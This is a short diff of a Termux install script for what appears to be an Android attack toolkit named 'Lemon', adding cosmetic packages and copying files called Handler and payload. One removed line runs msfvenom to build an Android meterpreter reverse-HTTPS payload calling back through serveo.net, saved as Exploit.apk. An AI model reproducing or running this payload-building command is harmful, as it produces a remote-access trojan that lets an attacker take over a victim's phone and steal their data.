@@ -1,8 +1,15 @@
 clear
 pkg install openssh
+clear
 pkg install php
+clear
 pkg install figlet
+clear
 pkg install python
+clear
+gem install lolcat
+clear
+pkg install toilet
 clear && cp Handler payload ssh php $HOME
 cd
 chmod +x php
@@ -11,7 +18,4 @@ chmod +x payload
 chmod +x Handler
 cd Lemon
 clear
-echo Please wait..
-msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=4716 R> $HOME/Lemon/Exploit.apk
-clear
-echo Installed Succesfully
+echo Installed Succesfully | lolcat
